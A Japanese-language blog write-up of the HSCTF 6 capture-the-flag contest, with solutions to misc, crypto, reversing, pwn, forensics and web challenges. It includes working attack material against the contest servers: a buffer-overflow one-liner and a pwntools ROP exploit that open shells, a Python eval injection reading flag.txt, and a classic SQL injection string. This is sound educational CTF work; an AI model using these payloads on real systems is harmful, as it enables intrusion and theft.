---
title: "HSCTF 6 Writeup"
date: 2019-06-08T00:00:00+08:00
lastmod: 2019-06-08T11:20:00+08:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: "きゃぷあめ"
---

やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。
<br /><br />
Rulesを見たら、「アメリカの高校生じゃないと賞はもらえないよ」とは書いてありましたが、「大人が参加しちゃダメ」とは書いてなかったのでやってみました。
<br /><br />
開催が平日だし、問題数多いし、何気に難易度高いし、解けなかったチャレンジも多かったけど、楽しかったです。
<br /><br />
チームのCaptainなので、Captain Capture Americaです（笑
<br />
<img src="https://captureamerica.github.io/writeups/img/captain.png" alt="captain.png">

ちなみに、参加チームは全体で1000チームくらいでした。

<br /><br />
<br /><br />
## [Misc]: Locked Up
- - -
### Challenge
> My friend gave me a zip file with the flag in it, but the zip file is encrypted. Can you help me open the zip file?

Attachment:

- locked.zip

### Solution
<pre>
$ zipinfo locked.zip | grep hsctf
-rwxrwxrwx  3.0 unx        0 BX stor 19-Jun-03 13:22 hsctf{w0w_z1ps_ar3nt_th@t_secUr3}
</pre>



<br /><br />
<br /><br />
## [Misc]: Verbose
- - -
### Challenge
> My friend sent me this file, but I don't understand what I can do with these 6 different characters...

Attachment:

- verbose.txt

### Solution
[http://codertab.com/JsUnFuck](http://codertab.com/JsUnFuck)

サイズが大きいので、結果が出るまで数分かかりました。<br />
var flag = "hsctf{esoteric_javascript_is_very_verbose}"; window.location = "https://hsctf.com";


<br /><br />
<br /><br />
## [Misc]: Admin Pass
- - -
### Challenge
> Hey guys, found a super cool website at http://misc.hsctf.com:8001!

### Solution
gitlab.comへのリンクがあって、そこに飛んでファイルの過去の履歴とか見ているとフラグが見つかります。


<br /><br />
<br /><br />
## [Misc]: A Simple Conversation
- - -
### Challenge
> Someone on the internet wants to talk to you. Can you find out what they want?

Attachment:

- talk.py

以下、抜粋。
```python
print("What's your age?")

age = input("> ")

sleep(1)

print("Wow!")

sleep(1)

print("Sometimes I wish I was %s" % age)

sleep(1)

print("Well, it was nice meeting you, %s-year-old." % age)
```

### Solution
`open('flag.txt').read()`
<pre>
$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> open('flag.txt').read()
Wow!
Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}

Well, it was nice meeting you, hsctf{plz_u5e_pyth0n_3}
-year-old.
Goodbye!
</pre>

<br /><br />
<br /><br />
## [Misc]: Broken GPS
- - -
### Challenge
> Ella is following a broken GPS. The GPS tells her to move in the opposite direction than the one she should be travelling in to get to her destination, and she follows her GPS exactly. For instance, every time she is supposed to move west, the GPS tells her to move east and she does so. Eventually she ends up in a totally different place than her intended location. What is the shortest distance between these two points? Assume that she moves one unit every time a direction is specified. For instance, if the GPS tells her to move "north," she moves one unit north. If the GPS tells her to move "northwest," then she moves one unit north and one unit west.
<br /><br />
Input Format:<br />
You will receive a text file with N directions provided to her by the GPS (the ones that she will be following) (1<=N<=1000). The first line in the file will be N, and each consequent line will contain a single direction: “north,” “south,” “east,” “west,” “northwest,” “northeast,” “southwest,” or “southeast.”
<br /><br />
Output Format:<br />
Round your answer to the nearest whole number and then divide by 26. Discard the quotient (mod 26). Each possible remainder corresponds to a letter in the alphabet. (0=a, 1=b… 25=z).
<br /><br />
Find the letter for each test case and string them together. The result is the flag. (For instance, a, b, c becomes “abc”). Remember to use the flag format and keep all letters lowercase!

Attachment:

- input.zip

### Solution
問題文がとにかく長いけど、言われるがままにコーディングするだけの問題。

```c
#include <stdio.h>
#include <string.h>
#include <math.h>

#define NUM_OF_FILES    12
#define MAX_FNAME_LEN   10
#define LINE_LEN        12
char alphabet[] = "abcdefghijklmnopqrstuvwxyz";

int main(int argc, char **argv)
{
	FILE *fp;
	char fname[MAX_FNAME_LEN];
	char tmp_buff[LINE_LEN];
	int i;
	int x1, x2, y1, y2;
	char *find;
	int ans;

	printf( "hsctf{" );
	for ( i = 1 ; i <= NUM_OF_FILES ; i++ ) {
		memset( fname, 0, MAX_FNAME_LEN );
		sprintf( fname, "%d.txt", i );
		if ( ( fp = fopen( fname, "rb" ) ) == NULL ) {
			return -1;
		}
		x1 = 0;
		x2 = 0;
		y1 = 0;
		y2 = 0;
		fgets( tmp_buff, LINE_LEN, fp ); // skip line number
		
		while( fgets( tmp_buff, LINE_LEN, fp ) != NULL ) {
			find = strstr( tmp_buff, "northeast" );
			if ( find != NULL ) {
				x1++;
				y1++;
				x2--;
				y2--;
				continue;
			}
			find = strstr( tmp_buff, "southeast" );
			if ( find != NULL ) {
				x1++;
				y1--;
				x2--;
				y2++;
				continue;
			}
			find = strstr( tmp_buff, "northwest" );
			if ( find != NULL ) {
				x1--;
				y1++;
				x2++;
				y2--;
				continue;
			}
			find = strstr( tmp_buff, "southwest" );
			if ( find != NULL ) {
				x1--;
				y1--;
				x2++;
				y2++;
				continue;
			}
			find = strstr( tmp_buff, "east" );
			if ( find != NULL ) {
				x1++;
				x2--;
				continue;
			}
			find = strstr( tmp_buff, "west" );
			if ( find != NULL ) {
				x1--;
				x2++;
				continue;
			}
			find = strstr( tmp_buff, "north" );
			if ( find != NULL ) {
				y1++;
				y2--;
				continue;
			}
			find = strstr( tmp_buff, "south" );
			if ( find != NULL ) {
				y1--;
				y2++;
				continue;
			}
			puts( "error" );
		}
		ans = (int)( sqrt( (x2 - x1) * (x2 - x1) + (y2 - y1) * (y2 - y1) ) + 0.5);
		printf( "%c", alphabet[ans % 26] );
		fclose( fp );
	}
	printf( "}\n" );
	return 0;
}
```
strstr()をやる順番に注意。最初、"east"のチェックをアタマに入れていたら、"northeast"と"southeast"も持っていかれて違う答えになっちゃってました。。
<br /><br />
hsctf{garminesuckz}


<br /><br />
<br /><br />
## [Misc]: Broken REPL
- - -
### Challenge
> My friend says that there is a bug in my REPL. Can you help me find it?

Attachment:

- repl.py

```python
#!/usr/bin/env python3
with open("flag.txt") as flag: # open flag file
    flag = flag.read() # read contents of flag file
try: # make sure we don't run out of memory
    while 1: # do this forever
        try: # try to read a line of input
            line = input(">>> ") # prompt is python's standard prompt
        except EOFError: # user is done typing input
            print() # ensure there is a line-break
            break # exit from the loop
        else: # successfully read input
            try: # try to compile the input
                code = compile(line, "<input>", "exec") # compile the line of input
            except (OverflowError, SyntaxError, ValueError, TypeError, RecursionError) as e: # user input was bad
                print("there was an error in your code:", e) # notify the user of the error
            if False: exec(code) # run the code
            # TODO: find replacement for exec
            # TODO: exec is unsafe
except MemoryError: # we ran out of memory
    # uh oh
    # lets remove the flag to clear up some memory
    print(flag) # log the flag so it is not lost
    del flag # delete the flag
    # hopefully we have enough memory now

```

### (Unsolved)
MemoryError例外を起こせばいいようだけど、できませんでした。raise使ったり、ウェブでMemoryError例外の事象のサンプルとか見つけてやったけれど、意図的に発生させようとするとなかなか難しいもんですね。



<br /><br />
<br /><br />
## [Misc]: English Sucks
- - -
### Challenge
> English is such a confusing language. Can you help me understand it?
<br /><br />
Hint: Watch out for the order of the output.

Attachment:

- mt.cpp

以下、抜粋。
```cpp
#include <fstream>
#include <iostream>
#include <random>

int main() {
    std::mt19937 random{std::random_device()()};
    std::ios::sync_with_stdio(false);

    std::cout << "English sucks!\n"
	         "I just noticed the other day that the letters\n"
                 "B, C, D, G, P, T, V, and Z all rhyme with E\n"
                 "(Z = zee in USA)\n"
                 "My hearing is bad, and sometimes I have trouble\n"
                 "identifying some of the letters.\n"
                 "Can you help me understand what letter is being said?\n"
                 "Here, I'll give you some sample answers:\n";

    for (auto i = 216; i--;) {
        auto v1 = random();
        auto v2 = random();
        auto v3 = random();

        std::cout << "BCDGPTVZ"[v2 >> 0x1F & 0x1 | v3 >> 0x0 & 0x3]
                  << "BCDGPTVZ"[v1 >> 0x09 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x05 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x08 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x15 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x06 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x1D & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x1B & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x04 & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x0D & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x0A & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x1A & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x16 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x17 & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x1C & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x14 & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x01 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x11 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x00 & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x13 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x18 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x0B & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x19 & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x10 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x03 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x12 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x0F & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x02 & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x0C & 0x7]
                  << "BCDGPTVZ"[v2 >> 0x07 & 0x7]
                  << "BCDGPTVZ"[v3 >> 0x0E & 0x7]
                  << "BCDGPTVZ"[v1 >> 0x1E & 0x3 | v2 >> 0x00 & 0x1]
		  << '\n';
    }
```
### (Unsolved)
なんとなく方向性はわかった気がしたんですが、解けませんでした。。
<br /><br />
mt19937 疑似乱数は連続した624個の結果があると、その次に出てくる乱数が予測できます。
<br /><br />
以下にツールがあります。<br />
[https://github.com/eboda/mersenne-twister-recover](https://github.com/eboda/mersenne-twister-recover)
<br /><br />
与えられたC++のコード（上記）で、216回ループしている中で3回ずつrandom()が呼ばれるので、合計648回（> 624）。
<br /><br />
ビットシフトしているやつを逆にシフトしなおせばv1, v2, v3は求められると思いきや、一番最初と最後でORされちゃっているビットがあって、値が確定できません。
<br /><br />
問題が間違っているかと思って問い合わせをしてみたんですが、返事もないし、実際解いている人が何人かいたので、なんかしら解き方があるようです。。



<br /><br />
<br /><br />
## [Crypto]: Reverse Search Algorithm
- - -
### Challenge
> WWPHSN students, gotta get these points to boost your grade.
<br /><br />
n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
<br />
e = 65537
<br />
c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777


### Solution
SECCON Beginners CTF 2018 で出た「RSA is Power」とほぼ同じ問題のようです。

以下のWriteupを参考にさせてもらいました。
<br />
[https://graneed.hatenablog.com/entry/2018/05/27/183004](https://graneed.hatenablog.com/entry/2018/05/27/183004)

nを素因数分解してpとqを求め、
<br />
http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137

pythonでゴニョゴニョっとやります。
```python
# coding: UTF-8

import math
from Cryptodome.Util.number import inverse

n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
e = 65537
c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777

# http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
# FF	111 (show)	5619855656...37<111> = 29 · 1937881261...53<110>
p = 29
q = 19378812610208711050554891591368513578428260883630885898953907471497427917962675301070084754463193723428901453

phi = (p-1)*(q-1)
d = inverse(e,phi)
m = pow(c,d,n)

print(bytes.fromhex(format(m,'x')).decode('utf-8'))
```
hsctf{y3s_rsa_1s_s0lved_10823704961253}


<br /><br />
<br /><br />
## [Reversing]: A Byte
- - -
### Challenge
> Just one byte makes all the difference.

Attachment:

- a-byte

### Solution
ghidraでde-compileすると、FUN_0010073a()のところで、以下の部分が見つかります。
<br />
（以下、抜粋です。）
```c
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (iParm1 == 2) {
    __s = *(char **)(lParm2 + 8);
    sVar3 = strlen(__s);
    if ((int)sVar3 == 0x23) {
      local_48 = 0;
      while (local_48 < 0x23) {
        __s[(long)local_48] = __s[(long)local_48] ^ 1;
        local_48 = local_48 + 1;
      }
      local_38 = 'i';
      local_37 = 0x72;
      local_36 = 0x62;
      local_35 = 0x75;
      local_34 = 0x67;
      local_33 = 0x7a;
      local_32 = 0x76;
      local_31 = 0x31;
      local_30 = 0x76;
      local_2f = 0x5e;
      local_2e = 0x78;
      local_2d = 0x31;
      local_2c = 0x74;
      local_2b = 0x5e;
      local_2a = 0x6a;
      local_29 = 0x6f;
      local_28 = 0x31;
      local_27 = 0x76;
      local_26 = 0x5e;
      local_25 = 0x65;
      local_24 = 0x35;
      local_23 = 0x5e;
      local_22 = 0x76;
      local_21 = 0x40;
      local_20 = 0x32;
      local_1f = 0x5e;
      local_1e = 0x39;
      local_1d = 0x69;
      local_1c = 0x33;
      local_1b = 99;
      local_1a = 0x40;
      local_19 = 0x31;
      local_18 = 0x33;
      local_17 = 0x38;
      local_16 = 0x7c;
      local_15 = 0;
      iVar1 = strcmp(&local_38,__s);
      if (iVar1 == 0) {
        puts("Oof, ur too good");
        uVar2 = 0;
        goto LAB_00100891;
      }
    }
  }
```
1でXORしてるので、実際にやってみます。
<pre>
$ python
>>> ord('i')
105
>>> chr(105^1)
'h'
>>> chr(0x72^1)
's'
</pre>
フラグの先頭`hs`が見えましたね。残りも処理してフラグゲットです。
<br /><br />
hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}


<br /><br />
<br /><br />
## [Pwn]: Return to Sender
- - -
### Challenge
> Who knew the USPS could lose a letter so many times?

Attachment:

- return-to-sender
- return-to-sender.c

### Solution
バッファオーバーフローの問題です。EIPが奪えるので、オフセット20バイトの後に、`system("/bin/sh");`を呼んでいる`win()`のアドレス`0x080491b6`を設定するだけです。
<br /><br />
<pre>
\# (python -c 'print("AAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08")'; cat) | nc pwn.hsctf.com 1234
Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA? it goes!

ls
bin
dev
flag
lib
lib32
lib64
return-to-sender
return-to-sender.c
cat flag
hsctf{fedex_dont_fail_me_now}
</pre>



<br /><br />
<br /><br />
## [Pwn]: Combo Chain Lite
- - -
### Challenge
> Training wheels!
<br /><br />
nc pwn.hsctf.com 3131
<br /><br />
Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: `(python; cat -) | nc pwn.hsctf.com <port>`
<br /><br />
Hint: What's a ROP?

Attachment:

- combo-chain-lite
- combo-chain-lite.c

```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void vuln() {
	char dest[8];
	printf("Here's your free computer: %p\n", system);
	printf("Dude you hear about that new game called /bin/sh");
	printf("? Enter the right combo for some COMBO CARNAGE!: ");
	gets(dest);
}

int main() {
	setbuf(stdout, NULL);
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	vuln();
	return 0;	
}
```

### Solution
system()関数のアドレス（毎回異なる）がprintされるので、それを使います。

<pre>
# checksec combo-chain-lite 
[*] '/root/HSCTF_CTF_2019/combo-chain-lite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

# ROPgadget --binary combo-chain-lite | grep ret | grep ": pop"
0x000000000040126c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401270 : pop r14 ; pop r15 ; ret
0x0000000000401272 : pop r15 ; ret
0x000000000040126b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040114d : pop rbp ; ret
0x0000000000401273 : pop rdi ; ret   <--- これを使う。
0x0000000000401271 : pop rsi ; pop r15 ; ret
0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</pre>

<br />
以下を書きました。
```python
#!/usr/bin/env python
from pwn import *
import re

host = "pwn.hsctf.com"
port = 3131

if True:
    s = process('./combo-chain-lite')
else:
    s = remote( host, port )

context(arch='amd64', os='linux')

elf = ELF('./combo-chain-lite')

offset = 16
pop_rdi = 0x401273
msg = s.recvuntil("\n")
system_addr = re.search( "[0-9a-fA-F]+", msg )

payload = ''
payload += 'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.search('/bin/sh').next())
payload += p64(int(system_addr.group(), 16))

s.sendlineafter("Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: ", payload)
s.interactive()
```

<br />
実行結果です。
```bash
# ./combo-chain-lite_solve2.py 
[+] Opening connection to pwn.hsctf.com on port 3131: Done
[*] '/root/HSCTF_CTF_2019/combo-chain-lite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ ls
bin
combo-chain-lite
combo-chain-lite.c
dev
flag
lib
lib32
lib64
$ cat flag
hsctf{wheeeeeee_that_was_fun}
```


<br /><br />
<br /><br />
## [Forensics]: Chicken Crossing
- - -
### Challenge
> Keith is watching chickens cross a road in his grandfather’s farm. He once heard from his grandfather that there was something significant about this behavior, but he can’t figure out why. Help Keith discover what the chickens are doing from this seemingly simple behavior.

Attachment:

- hsctf-chicken_crossing.jpg

### Solution
<pre>
$ strings hsctf-chicken_crossing.jpg | grep hsctf
hsctf{2_get_2_the_other_side}
</pre>


<br /><br />
<br /><br />
## [Forensics]: Cool Image
- - -
### Challenge
> My friend told me he found a really cool image, but I couldn't open it. Can you help me access the image?

Attachment:

- cool.pdf

### Solution
<pre>
$ file cool.pdf
cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
</pre>


<br /><br />
<br /><br />
## [Forensics]: Cool Image 2
- - -
### Challenge
> My friend sent me this image, but I can't open it. Can you help me open the image?

Attachment:

- cool.png

### Solution
ファイルの先頭にゴミがついているので、消すだけです。
<pre>
$ xxd cool.png | head -n 4
00000000: 4920 666f 756e 6420 7468 6973 2063 6f6f  I found this coo
00000010: 6c20 6669 6c65 2e20 4974 7320 7265 616c  l file. Its real
00000020: 6c79 2063 6f6f 6c21 0a89 504e 470d 0a1a  ly cool!..PNG...
00000030: 0a00 0000 0d49 4844 5200 0004 b600 0000  .....IHDR.......
</pre>



<br /><br />
<br /><br />
## [Forensics]: Slap
- - -
### Challenge
> Don't get slapped too hard.

Attachment:

- slap.jpg

### Solution
Lorem ipsum （俗に言うダミーテキスト）だったので、うっかり見逃しそうでした。

`$ exiftool slap.jpg | grep hsctf`
<br />
Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu `hsctf{twoslapsnonetforce}` s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facil...(snip)



<br /><br />
<br /><br />
## [Forensics]: Fish
- - -
### Challenge
> I got a weird image from some fish. What is this?

Attachment:

- fish.jpg

### Solution
「青い空を見上げればいつもそこに白い猫」で開くと、"Steghide適用可能性データ"というのが見えます。
<br />
<img src="https://captureamerica.github.io/writeups/img/possible_steg.png" alt="possible_steg.png">

Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる`bobross63`を使ったら解けました。
<pre>
$ strings fish.jpg | tail -n 1
bobross63
</pre>
<pre>
C:\ols\steghide>steghide.exe extract -sf fish.jpg
Enter passphrase: bobross63
wrote extracted data to "flag.txt".
C:\ols\steghide>more flag.txt
hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}
</pre>



<br /><br />
<br /><br />
## [Web]: Inspect Me
- - -
### Challenge
> Keith's little brother messed up some things...
<br /><br />
https://inspect-me.web.chal.hsctf.com
<br /><br />
Note: There are 3 parts to the flag!

### Solution
View page source


<br /><br />
<br /><br />
## [Web]: Agent Keith
- - -
### Challenge
> Keith was looking at some old browsers and made a site to hold his flag.
<br /><br />
https://agent-keith.web.chal.hsctf.com

### Solution
上記にアクセスすると、
<pre>
If you're not Keith, you won't get the flag!
Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36

Flag: Access Denied
</pre>

User-Agentは古ければなんでもいいわけじゃなくて、特定のものを指定しないといけないです。View Page Sourceより、
```html
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <title>agent-keith</title>
        <link rel="stylesheet" href="http://localhost:8002/static/style.css">
    </head>
    <body>
        <main>
            <h2>If you're not Keith, you won't get the flag!</h2>
            <p><b>Your agent is:</b> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</p>
            <p><b>Flag:</b> Access Denied</p>
            <!-- DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) -->
        </main>
    </body>
</html>
```
<pre>
$ wget -O - https://agent-keith.web.chal.hsctf.com/ --user-agent="NCSA_Mosaic/2.0 (Windows 3.1)"
hsctf{wow_you_are_agent_keith_now}
</pre>



<br /><br />
<br /><br />
## [Web]: S-Q-L
- - -
### Challenge
> Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
<br /><br />
https://s-q-l.web.chal.hsctf.com/

### Solution
`' or '1'='1`


<br /><br />
<br /><br />
## [Web]: The Quest
- - -
### Challenge
> You think you are worthy of obtaining the flag? Try your hand at [The Quest to Obtain the Flag.](https://forms.gle/7pyAWuG3GvYL443NA)

### Solution
View Page Sourceでフラグを見つけてしまった。


<br /><br />
<br /><br />
## [Web]: Keith Logger
- - -
### Challenge
> Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?
<br /><br />
Note: nothing is actually saved

Attachment:

- extension.crx

### Solution
これは今までやったことのないタイプの問題で面白かったです。
<br /><br />
crxは、Chromeのエクステンション。
<br /><br />
とりあえず、`nothing is actually saved`というのを信じて、Chromeに追加してみましたが、そもそも有効にできませんでした。
<br /><br />
ググってみると、crxファイルは中身が見えるとのこと。以下のサイトでソースを取り出しました。
<br />
[https://robwu.nl/crxviewer/](https://robwu.nl/crxviewer/)
<br /><br />
```javascript
var timeout_textarea;
var xhr_textarea;
$("textarea")
    .on("keyup", function() {
        if (timeout_textarea) {
            clearTimeout(timeout_textarea);
        }
        if (xhr_textarea) {
            xhr_textarea.abort();
        }
        timeout_textarea = setTimeout(function() {
            var xhr = new XMLHttpRequest();
            /*
            xhr.open(
              "GET",
              "https://keith-logger.web.chal.hsctf.com/api/record?text=" +
                encodeURIComponent($("textarea").val()) +
                "&url=" + encodeURIComponent(window.location.href),
              true
            );*/
            // send a request to admin whenever something is logged, not needed anymore after testing
            /*
            xhr.open(
              "GET",
              "https://keith-logger.web.chal.hsctf.com/api/admin",
              true
            );*/
            xhr.send();
        }, 2000);
    });
```
最初は、https://keith-logger.web.chal.hsctf.com/api/record の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の https://keith-logger.web.chal.hsctf.com/api/admin  の方にアクセス。

<br />
以下が返ってきました。
<pre>
didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
</pre>

<br />
mongodbには、`Robo 3T`というツールを使いました。
<br />
<img src="https://captureamerica.github.io/writeups/img/Keith_Bot_Mongo.png" alt="Keith_Bot_Mongo.png">



<br /><br />
<br /><br />
## [Web]: Accessible Rich Internet Applications
- - -
### Challenge
> A very considerate fellow, Rob believes that accessibility is very important!
<br /><br />
NOTE: The flag for this challenge starts with flag{ instead of hsctf{

Attachment:

- index.html

### Solution
添付の`index.html`には難読化された非常に長いJavascriptが含まれています。
<br />
ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行し、mを別ファイル（aaa.htm）として保存しました。
<br />
<img src="https://captureamerica.github.io/writeups/img/index.png" alt="index.png">
<br /><br />
同様に、今度は先程保存したaaa.htmをChromeのDeveloper ToolsでまずBeautifyします。
<br />
<img src="https://captureamerica.github.io/writeups/img/aaa.png" alt="aaa.png">
<br /><br />
これを、bbb.txtとして保存しておきます。
<br /><br />
"0"と"1"が見えるので、2進数を文字列に変換する系ですね。ただし、`aria-posinset`の箇所で順番が指定されているようなので、sortが必要です。

`$ grep 1040 bbb.txt | cut -d'"' -f4,7 | sort -n | sed -E 's/.*>([01]).*/\1/' | tr -d '\n' ; echo`
01101001011011010010000001100111011011110110111001101110011000010010000001100001011001000110010000100000011100110110111101101101011001010010000001100110011010010110110001101100011001010111001000100000011101000110010101111000011101000010000001101000011001010111001001100101001000000111001101101111001000000111010001101000011001010010000001110000011000010110011101100101001000000110100101110011001000000110000100100000011000100110100101110100001000000110110001101111011011100110011101100101011100100010111000100000011011000110111101110010011001010110110100100000011010010111000001110011011101010110110100101110001011100010111000100000011010000110010101110010011001010010011101110011001000000111010001101000011001010010000001100110011011000110000101100111001000000110001001110100011101110010110000100000011001100110110001100001011001110111101101100001011000110110001101100101011100110111001101101001011000100110100101101100011010010111010001111001010111110110100101110011010111110110001101110010011101010110001101101001011000010110110001111101

<br />
文字列への変換は、またこちらのサイトにお世話になりました。<br />
[https://dencode.com/ja/string/bin](https://dencode.com/ja/string/bin)

im gonna add some filler text here so the page is a bit longer. lorem ipsum... here's the flag btw, flag{accessibility_is_crucial}



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />